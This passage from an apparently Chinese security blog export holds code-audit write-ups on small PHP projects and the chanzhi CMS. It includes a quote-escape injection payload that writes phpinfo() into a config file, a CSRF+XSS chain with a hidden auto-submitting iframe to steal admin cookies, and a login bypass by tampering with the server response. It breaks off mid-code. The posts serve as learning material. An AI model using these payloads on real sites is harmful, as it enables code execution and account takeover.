<p>那么这个是需要我们可以执行代码，那么该如何呢？  目前想到的办法只有把<code>index.php</code>中写入<code>option.php</code>的值修改为恶意的代码才能执行~  但是这里把单引号过滤了所以我们能利用如下这个办法绕过，先看下小案例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$str&#x3D;&#39;123321\\&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">phpinfo();</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/ugmmntubddcwikbb5kr94eiu/1.png" alt="1.png-45.8kB"></p>
<p>可以看到<code>2</code>个<code>\\</code>符号是可以让<code>&#39;</code>成功变成是<code>&#39;</code>单引号的，那么这样是可以成功逃逸单引号限制的，所以我们可以利用这个办法来绕过，访问如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?option&#x3D;1\&#39;;%0aphpinfo();&#x2F;&#x2F;</span></pre></td></tr></table></figure>

<p>然后写入<code>php</code>后会变成这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$option&#x3D;&#39;1\\&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">phpinfo();&#x2F;&#x2F;&#39;;</span></pre></td></tr></table></figure>

<blockquote>
<p>解释：<br>因为<code>&#39;</code>会变成<code>\&#39;</code>那么，只要在单引号前面加上<code>\</code>就变成<code>\\&#39;</code>成功逃逸单引号，然后<code>%0a</code>写入后变成空行，然后把后面多余的符号给注释了，否则会报错</p>
</blockquote>
<p>然后我们来访问一下</p>
<p><img src="http://static.zybuluo.com/1kbfree/qlbbja8d467jy0yjwvbixwnc/image_1cql661g3vap1bn24soardv1q5k.png" alt="image_1cql661g3vap1bn24soardv1q5k.png-60.5kB"></p>
<p>还有一个办法也可以绕过</p>
<p>首先我们来访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?option&#x3D;123&#39;;%0aphpinfo();&#x2F;&#x2F;</span></pre></td></tr></table></figure>

<p>然后代码会变成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$option=<span class="string">'123\';</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">phpinfo();//'</span>;</span></pre></td></tr></table></figure>

<p>但是这个时候是无法执行<code>phpinfo</code>函数的，因为<code>$option</code>变量后面没有单引号，所以等于第二行也是<code>$option</code>变量值</p>
<p><img src="http://static.zybuluo.com/1kbfree/wpi8595hsqdif2e40f878v1z/1.png" alt="1.png-43.6kB"></p>
<p>那么我们可以再去访问一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?option&#x3D;666</span></pre></td></tr></table></figure>

<p>然后代码变成如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/phxzkz45f44wvo4fqw5j89b1/1.png" alt="1.png-51.1kB"></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>对chanzhi企业门户系统的一次测试</title>
    <url>/2018/04/18/%E5%AF%B9chanzhi%E4%BC%81%E4%B8%9A%E9%97%A8%E6%88%B7%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<blockquote>
<p>依稀记得，这是我挖的第一个漏洞，非常怀念。</p>
</blockquote>
<p>系统官网:<a href="http://www.chanzhi.org/?v=7.0.1" target="_blank" rel="noopener">http://www.chanzhi.org/?v=7.0.1</a><br>安装步骤之类的就省去了，直接开始测试</p>
<h2 id="Csrf-Xss漏洞"><a href="#Csrf-Xss漏洞" class="headerlink" title="Csrf+Xss漏洞"></a>Csrf+Xss漏洞</h2><h3 id="漏洞复现过程："><a href="#漏洞复现过程：" class="headerlink" title="漏洞复现过程："></a>漏洞复现过程：</h3><p><strong>漏洞处:后台-&gt;内容-&gt;维护目录( <code>www.yousite.xxx/www/admin.php?m=tree&amp;f=browse&amp;type=article</code> )</strong><br><img src="http://static.zybuluo.com/1kbfree/1eqczzj0lmvp5bx7cuytacx7/image_1cf22p9ph1h001c11c48en41udv9.png" alt="image_1cf22p9ph1h001c11c48en41udv9.png-88kB"></p>
<h3 id="尝试输入一些恶意代码"><a href="#尝试输入一些恶意代码" class="headerlink" title="尝试输入一些恶意代码:"></a>尝试输入一些恶意代码:</h3><p><img src="http://static.zybuluo.com/1kbfree/9jkepe0movhb3wqnogdp3q72/image_1cf22sib1r2s1gmr1ef91jdobl3m.png" alt="image_1cf22sib1r2s1gmr1ef91jdobl3m.png-94kB"><br><em>这里因为发现没有过滤，所以存在Xss漏洞，但是这里我们是不可能插入的(除非管理员自己插入的，那么，我们就来看看有没有Csrf漏洞可以结合一下)，然后就想着用<code>Burp</code>抓包分析一下，发现有戏~</em></p>
<h3 id="用Burp抓包分析一波，并且放入Repeater模块"><a href="#用Burp抓包分析一波，并且放入Repeater模块" class="headerlink" title="用Burp抓包分析一波，并且放入Repeater模块"></a>用Burp抓包分析一波，并且放入Repeater模块</h3><p><img src="http://static.zybuluo.com/1kbfree/kamwo6vjibi723vy6xsftfpj/image_1cf234ih41j9j13q81fui1vt61e4613.png" alt="image_1cf234ih41j9j13q81fui1vt61e4613.png-179.2kB"><br><em>这里并没有发现有<code>Token</code>验证，那么我们来利用<code>Burp</code>自带的生成<code>Csrf Poc</code></em></p>
<ol>
<li><p>右键-&gt;Engagement tools-&gt;Generate Csrf PoC<br><img src="http://static.zybuluo.com/1kbfree/spy3dawa6wefouk801yjbmmy/image_1cf238hq59dd17s81hmc19fo17de1g.png" alt="image_1cf238hq59dd17s81hmc19fo17de1g.png-200.7kB"></p>
</li>
<li><p>自动写出PoC，我们直接复制到本地的HTML文件里<br><img src="http://static.zybuluo.com/1kbfree/z77f48e487ibum2kzqzgtbyg/image_1cf23afcu47711rc1f8dda51td81t.png" alt="image_1cf23afcu47711rc1f8dda51td81t.png-130.6kB"><br><img src="http://static.zybuluo.com/1kbfree/ia6pgpvoujwmaiubnvr32dac/image_1cf23be0010jv2trk20h981fa32a.png" alt="image_1cf23be0010jv2trk20h981fa32a.png-166.1kB"></p>
</li>
<li><p>在浏览器中打开这个生成的PoC<br><img src="http://static.zybuluo.com/1kbfree/bi0vt6ds8xk4tjja26jatavc/image_1cf23jr1ahr71q7oh512dkthq51.png" alt="image_1cf23jr1ahr71q7oh512dkthq51.png-32.9kB"><br><img src="http://static.zybuluo.com/1kbfree/akzoa6mwnynhh9alfkz5z27d/image_1cf23er16or4g0a18gh18ap7a22n.png" alt="image_1cf23er16or4g0a18gh18ap7a22n.png-78.5kB"><br><img src="http://static.zybuluo.com/1kbfree/zodoc27hx19hevz7zi2yu7yz/image_1cf23lrb4153tkd2123m1v988p85e.png" alt="image_1cf23lrb4153tkd2123m1v988p85e.png-81.4kB"></p>
</li>
</ol>
<p><em>ok，存在Csrf漏洞</em></p>
<blockquote>
<p>我们可以利用社工来把这个文件发送给管理员，如果管理员选择了打开的话那么就可以盗取他的Cookie了，那么很多人会问，管理员看到这样的界面肯定会不点击啦，那么我给你一个思路，就是把csrf_poc的代码放在 1.html 文件( 把点击提交修改为自动提交 )，然后把2.html文件用 iframe标签把 1.html 文件嵌入 并且把iframe标签透明度设置为100%，那么管理员打开后就会自动提交表单并且不会展示在2.html页面上<del>~</del></p>
</blockquote>
<hr>
<blockquote>
<p>本来还想写另一个漏洞的，可惜无法绕过，实属能力有限<del>~ ~</del></p>
</blockquote>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP原生程序之博客分析</title>
    <url>/2018/03/07/PHP%E5%8E%9F%E7%94%9F%E7%A8%8B%E5%BA%8F%E4%B9%8B%E5%8D%9A%E5%AE%A2%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>这是一个<code>GITHUB</code>上找到的一个使用原生<code>PHP</code>代码写的一个博客，地址是:<code>https://github.com/qinshuang1998/Tiger-Blog</code>，但是这里有很多功能没有实现（这个作者是不是比我还懒，，，哈哈哈），然后我分析的话只是想让大家明白一下这些功能是如何实现的，还有如果有漏洞的话我也会写出来（因为我是边读边写，然后自己分析一下，但是因为我水平也不是很厉害，所以有很多漏洞也没看出来还请大佬们多多指教），对我们的代码审计有很大的帮助，不多说啦，</p>
<h3 id="源代码讲解"><a href="#源代码讲解" class="headerlink" title="源代码讲解"></a>源代码讲解</h3><h4 id="First、"><a href="#First、" class="headerlink" title="First、"></a>First、</h4><p>这里说明一下，我分析的时候，只会写注释，或者截屏然后在旁边标注一下，因为我觉得这样会比较高效一点，所以你们可以下载这个源代码，然后按照我分析的然后再自己看一下，大概也就能明白功能实现原理了，祝你学习愉快。</p>
<h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><p>这个是首页文件( 废话，我也知道 )~</p>
<p><img src="http://static.zybuluo.com/1kbfree/y253t8g6t8ct44fjd2q1i1hp/image_1chv32k2d1s6c1dp44h57298is9.png" alt="image_1chv32k2d1s6c1dp44h57298is9.png-125.8kB"></p>
<h5 id="首先看第三行和第四行："><a href="#首先看第三行和第四行：" class="headerlink" title="首先看第三行和第四行："></a>首先看第三行和第四行：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span>(<span class="string">'./inc/conn.php'</span>); <span class="comment">// 连接数据库</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">require</span>(<span class="string">'./inc/func.php'</span>); <span class="comment">// 引入函数文件(一般都是封装了常用的函数,方便调用)</span></span></pre></td></tr></table></figure>
<p>这个不必多说。</p>
<h5 id="接着到了第七行："><a href="#接着到了第七行：" class="headerlink" title="接着到了第七行："></a>接着到了第七行：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$url = $_SERVER[<span class="string">'REQUEST_URI'</span>]; <span class="comment">//这个功能我也不知道是干嘛的，我们来输出一下。</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( $url );<span class="keyword">die</span>; <span class="comment">//输出一下$url,并且不然他执行下面的代码</span></span></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/1kbfree/5h92eelh5zlrpn3vfrakjo5c/image_1chv3750l31210tlns91rc7mlom.png" alt="image_1chv3750l31210tlns91rc7mlom.png-54.1kB"><br><img src="http://static.zybuluo.com/1kbfree/y2bzhzgo1rk1crxwyot68h9s/image_1chv37qd4bluakblkmh17k8213.png" alt="image_1chv37qd4bluakblkmh17k8213.png-57.7kB"></p>
<p>这个是用于输出除了域名外的路径。</p>
<h5 id="第8行："><a href="#第8行：" class="headerlink" title="第8行："></a>第8行：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$url = parse_url($url); <span class="comment">// parse_url将路径放在了数组的path，将?后面的参数放在了数组的query</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( $url );<span class="keyword">die</span>; <span class="comment">// 如果上面字体描述的不懂我们再来打印一下。</span></span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/0vzpjjzrcc43mj67svdwsnzl/image_1chv3h8iu1alr1u7b1b3015dq19u61g.png" alt="image_1chv3h8iu1alr1u7b1b3015dq19u61g.png-29.6kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/fzjzo21zxp86npuirk9cl3pk/php.png" alt="php.png-146.3kB"></p>
<h5 id="打印-num："><a href="#打印-num：" class="headerlink" title="打印$num："></a>打印$num：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump( $num );<span class="keyword">die</span>;</span></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/1kbfree/9vbxv83wly06fgrb5c3o01bj/image_1chv3taag1o2119grhdq1vsuos0l.png" alt="image_1chv3taag1o2119grhdq1vsuos0l.png-25.3kB"></p>
<p><em>这里为什么是5呢？我也好奇，然后我来到数据库看了一下。</em></p>
<p><img src="http://static.zybuluo.com/1kbfree/j2ua1x2o2k0y2x6nktgi7z1s/image_1chv421os1d9e1eaequa1fu61rp83f.png" alt="image_1chv421os1d9e1eaequa1fu61rp83f.png-85kB"></p>
<p><em>这个5就是<code>article</code>表的数量</em></p>
<h5 id="16-23行"><a href="#16-23行" class="headerlink" title="16-23行"></a>16-23行</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'page'</span>])&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">// 把个个参数都打印一下。</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	$pageval=$_GET[<span class="string">'page'</span>];</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">echo</span>( <span class="string">'$pageval -&gt; '</span>.$pageval .<span class="string">"&lt;br /&gt;"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	$page=($pageval<span class="number">-1</span>)*$pagesize;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">echo</span>( <span class="string">'$page -&gt; '</span>.$page .<span class="string">"&lt;br /&gt;"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	$page.=<span class="string">','</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">echo</span>( <span class="string">'$page -&gt; '</span>.$page .<span class="string">"&lt;br /&gt;"</span>);<span class="keyword">die</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/jjv1b3ykbxdacsy78apoiaz1/image_1chv4b03q5ps106732kps68no4s.png" alt="image_1chv4b03q5ps106732kps68no4s.png-49.1kB"></p>
<p><em>看不明白看下去先</em></p>
<p><img src="http://static.zybuluo.com/1kbfree/tlgsb75z0prxkkyspwclzfml/image_1chv4djq76svshi2s31otkm7g59.png" alt="image_1chv4djq76svshi2s31otkm7g59.png-134.4kB"></p>
<p><em>然后下面的就基本上是简单的<code>SQL</code>语句了，不讲解了，开始另一个文件</em></p>
<h4 id="admin功能"><a href="#admin功能" class="headerlink" title="admin功能"></a>admin功能</h4><p>先讲解后台功能的实现。</p>
<h5 id="登陆功能"><a href="#登陆功能" class="headerlink" title="登陆功能"></a>登陆功能</h5><p><img src="http://static.zybuluo.com/1kbfree/brc7ftnqs452j4xf08r6uj8j/php.png" alt="php.png-86.7kB"></p>
<blockquote>
<p>在<code>xxx/admin/login.php</code></p>
</blockquote>
<h6 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h6><p>打开后发现只有一句代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">require</span>(<span class="string">'./page/login.html'</span>); <span class="comment">// 包含当前的page文件夹里的login.html文件</span></span></pre></td></tr></table></figure>

<h6 id="login-html"><a href="#login-html" class="headerlink" title="login.html"></a>login.html</h6><p>打开后就是一些前端登陆的表单以及一些样式，然后他是将登陆的数据提交到<code>confirm.php</code>文件，如图：</p>
<p><img src="http://static.zybuluo.com/1kbfree/5l8j1c0xqox3ml672s9vuypa/image_1chv4qovjliodscff9nr61smr82.png" alt="image_1chv4qovjliodscff9nr61smr82.png-149.6kB"></p>
<p>表单之类的<code>html</code>代码不多讲，这里来分析一下js代码(这里有一个问授权访问漏洞，可以不输入密码直接登陆)：</p>
<p><img src="http://static.zybuluo.com/1kbfree/5pqcsn5zw54secwj3s3ucf92/image_1chv5gf6v1fst1gv71kj61i161p538v.png" alt="image_1chv5gf6v1fst1gv71kj61i161p538v.png-172.4kB"></p>
<p>然后我们来尝试登陆一下，查看<code>result</code>都会返回什么~</p>
<p><img src="http://static.zybuluo.com/1kbfree/ooxrb0fsh5ipc0zij5iwcbp6/image_1chv5i6ucjs1vni1vonsji1pcn9c.png" alt="image_1chv5i6ucjs1vni1vonsji1pcn9c.png-109.6kB"></p>
<p><em>表示登陆成功</em></p>
<p><img src="http://static.zybuluo.com/1kbfree/sk4m0o2rczor7msf5pdt26yv/image_1chv5innl6vj1lo54241k2v1jdo9p.png" alt="image_1chv5innl6vj1lo54241k2v1jdo9p.png-110kB"></p>
<p><em>表示登陆失败</em></p>
<p><strong>我们身为白帽子，就是用来打破这些规矩的，输入错误密码的时候我们来抓包获取返回结果并且将<code>result</code>修改为<code>success</code>~</strong></p>
<p><img src="http://static.zybuluo.com/1kbfree/xhumgcamh5j9uge6bj2ur0e4/php.png" alt="php.png-185.1kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/aif4kvy0lrvr90bdcv39pbpo/image_1chv5pvt5r761cm817v410slt023l.png" alt="image_1chv5pvt5r761cm817v410slt023l.png-95.7kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/76ue5oiav00tak7dvn1e077g/image_1chv5r0er6g8qe01tt81fdkhf842.png" alt="image_1chv5r0er6g8qe01tt81fdkhf842.png-90.1kB"><br><em>成功绕过</em></p>
<p><img src="http://static.zybuluo.com/1kbfree/twgquzlmt9muvuo9lak67i8p/image_1chv5rc1g1a5t15ef9qu1hsqcbe4f.png" alt="image_1chv5rc1g1a5t15ef9qu1hsqcbe4f.png-92.7kB"></p>
<p>接下来讲解一下<code>confirm.php</code>文件是如何接受数据的。</p>
<h6 id="confirm-php"><a href="#confirm-php" class="headerlink" title="confirm.php"></a>confirm.php</h6><p><img src="http://static.zybuluo.com/1kbfree/u0ds3ms0ocjbpibqcvyk2oi9/image_1chv6gl8n15dpns31br5p11ttf5c.png" alt="image_1chv6gl8n15dpns31br5p11ttf5c.png-178.3kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/hb07nekxlo0afqp3jvfma62m/image_1chv6jdc0lak1c5h1bvl1if21es37p.png" alt="image_1chv6jdc0lak1c5h1bvl1if21es37p.png-88.8kB"></p>
<p>上面的<code>$result</code>使用了<code>GetALL</code>函数，我们来看一下他的代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetAll</span><span class="params">($query)</span> </span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">while</span>($tmp = mysql_fetch_array($query))&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		$result[] = $tmp;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">return</span> @$result;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<p>查询<code>$query</code>这个<code>sql</code>语句执行后的数据然后循环赋值到<code>$result</code>数组里。</p>
<p><img src="http://static.zybuluo.com/1kbfree/2stc0xet22rj0o3ziicshqm1/image_1ci0vr2aq1udv1t4pun115fp1a6bp.png" alt="image_1ci0vr2aq1udv1t4pun115fp1a6bp.png-169.1kB"></p>
<p><em>这里的不多将了，具体有注释了，下面没注释的就是一些登陆操作的（我也看不懂）</em></p>
<h6 id="index-php-1"><a href="#index-php-1" class="headerlink" title="index.php"></a>index.php</h6><p>登陆页面分析完了，来分析一下首页页面。</p>
<p><img src="http://static.zybuluo.com/1kbfree/mr0s9mk7c9vjn1oi37zc3xep/image_1ci100s7mi9g14vbasa16ft1aot26.png" alt="image_1ci100s7mi9g14vbasa16ft1aot26.png-115.3kB"></p>
<p><strong>page文件夹里面的都是<code>html</code>文件，也就是展示页面效果的，就不多讲解了。</strong></p>
<h6 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h6><blockquote>
<p>这个文件是后台发布文章的</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/y77pa1n0wrgpus8ufy3ma3cf/image_1ci105k2r71l1k2d1na5sb11g7s2j.png" alt="image_1ci105k2r71l1k2d1na5sb11g7s2j.png-81.4kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/xm9ymwrgn5obbsfwyb7dsyl4/image_1ci10doif73q1vun1l5fq9a9i70.png" alt="image_1ci10doif73q1vun1l5fq9a9i70.png-180.8kB"></p>
<p>这里是存在<code>Csrf</code>漏洞的，而且也没有过滤<code>Xss</code>漏洞，所以是存在<code>Xsrf</code>的，但是因为这里他完成了插入功能，但是没有完成展示插入的数据的功能，所以没办法继续讲解了，等作者把功能实现了我再来具体分析。</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>简单的PHP用户管理分析</title>
    <url>/2018/01/13/%E7%AE%80%E5%8D%95%E7%9A%84php%E7%90%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><img src="http://static.zybuluo.com/1kbfree/k5qvxxtdmbdxj9tpqq9x10fa/timg.jpg" alt="PHP图片"></p>
<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>这是笔者从GITHUB上找的简单PHP程序(用于学习)</p>
<p><img src="http://static.zybuluo.com/1kbfree/4z5de16ziysrio7dqad9u1ow/image_1cc2vfnu31qpg1a1j1fob13be3ejm.png" alt="image_1cc2vfnu31qpg1a1j1fob13be3ejm.png-72.6kB"><br><strong>这是一个可 增删查 的用户数据管理</strong></p>
<hr>
<h2 id="数据库连接代码"><a href="#数据库连接代码" class="headerlink" title="数据库连接代码:"></a>数据库连接代码:</h2><p><strong>先介绍一下数据库的表结构：</strong></p>
<p><img src="http://static.zybuluo.com/1kbfree/jgp8ljt3m0adp7i8ty1kkdr2/image_1cc3136er1ru31m9si1chlcue21t.png" alt="image_1cc3136er1ru31m9si1chlcue21t.png-24.4kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pdo &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;data&#39;,&#39;root&#39;,&#39;root&#39;); &#x2F;&#x2F;PDO(PHP访问数据库定义了一个轻量级的、一致性的接口，它提供了一个数据访问抽象层，这样，无论使用什么数据库，都可以通过一致的函数执行查询和获取数据，比如mysql有limit，MSSQL没有limit，pdo会自动转换)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pdo-&gt;exec(&#39;set names utf8&#39;); &#x2F;&#x2F;设置编码</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_ASSOC); &#x2F;&#x2F;设置默认结果集模式为关联数组</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); &#x2F;&#x2F;修改报错模式</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
<h3 id="其中的PDO是"><a href="#其中的PDO是" class="headerlink" title="其中的PDO是:"></a>其中的PDO是:</h3><p><em>PDO(PHP访问数据库定义了一个轻量级的、一致性的接口，它提供了一个数据访问抽象层，这样，无论使用什么数据库，都可以通过一致的函数执行查询和获取数据，比如mysql有limit，MSSQL没有limit，pdo会自动转换)</em></p>
<p><strong>PDO好处：</strong></p>
<ol>
<li>更换数据库时取得极大便利(从A数据库换成其他数据库可以不需要修改查询的代码，因为PDO帮我实现了)</li>
<li>更换数据库时取得极大便利</li>
</ol>
<h2 id="首页代码："><a href="#首页代码：" class="headerlink" title="首页代码："></a>首页代码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">include</span> <span class="string">'config.inc.php'</span>; <span class="comment">//包含连接数据库的代码</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	$len = <span class="number">10</span>; <span class="comment">//每页展现10条数据</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	$page = !<span class="keyword">empty</span>($_GET[<span class="string">"page"</span>]) ? $_GET[<span class="string">"page"</span>] : <span class="number">1</span>;<span class="comment">//三元表达式，表示如果$_GET['page']为空时，默认值为1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    $sqlTotal = <span class="string">"select count(Id) from t1"</span>; <span class="comment">// SQL语句。意思是查询t1表中的Id字段个数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    $smtTotal = $pdo-&gt;prepare($sqlTotal); <span class="comment">//准备要执行的SQL语句并返回一个 PDOStatement 对象(PHP 5 &gt;= 5.1.0, PECL pdo &gt;= 0.1.0)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;strong&gt;\$sqlTotal:&lt;/strong&gt;"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print_r($smtTotal);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;strong&gt;execute():&lt;/strong&gt;"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	print_r($smtTotal-&gt;execute());</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $tot = $smtTotal-&gt;fetchColumn();	<span class="comment">//总记录数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;strong&gt;\$tot:&lt;/strong&gt;"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print_r($tot);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pages = ceil($tot/$len);	<span class="comment">//总页数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;strong&gt;\$pages:&lt;/strong&gt;"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print_r($pages);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    ... ...(省略，先讲解一下这段代码的用法)</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/bepqcvepabcym10rq7qnksgz/image_1cc30pp7sd2s1qr7198mul41vig1g.png" alt="image_1cc30pp7sd2s1qr7198mul41vig1g.png-34.8kB"></p>
<blockquote>
<p>可以看看我写的PDO的（博客里找）</p>
</blockquote>
<h3 id="首页的代码我统统写了注释："><a href="#首页的代码我统统写了注释：" class="headerlink" title="首页的代码我统统写了注释："></a>首页的代码我统统写了注释：</h3><p><img src="http://static.zybuluo.com/1kbfree/sc0wogf37jngd8cpysvke01r/image_1cc3s3mnp9ma7luult1egp1rk19.png" alt="image_1cc3s3mnp9ma7luult1egp1rk19.png-178.8kB"></p>
<h2 id="更改用户数据代码："><a href="#更改用户数据代码：" class="headerlink" title="更改用户数据代码："></a>更改用户数据代码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">    思路:先获取对应的数据，然后返回到输入框，如果我们选择提交，表单就会发送的数据就会更改到数据库里，实现更改内容</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">*/</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'config.inc.php'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$Id = $_GET[<span class="string">"Id"</span>]; <span class="comment">//获取GET请求过来的Id值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$sql = <span class="string">"select * from t1 where Id=?"</span>; <span class="comment">//SQL语句的查询</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">$smt = $pdo-&gt;prepare($sql); <span class="comment">//给SQL语句做标记</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">$smt-&gt;bindValue(<span class="number">1</span>,$Id); <span class="comment">//想成是给上面的?改成$Id变量的值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">$smt-&gt;execute(); <span class="comment">//执行SQL语句</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$row = $smt-&gt;fetch(); <span class="comment">//接收SQL语句查询到的结果</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;html&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;head&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    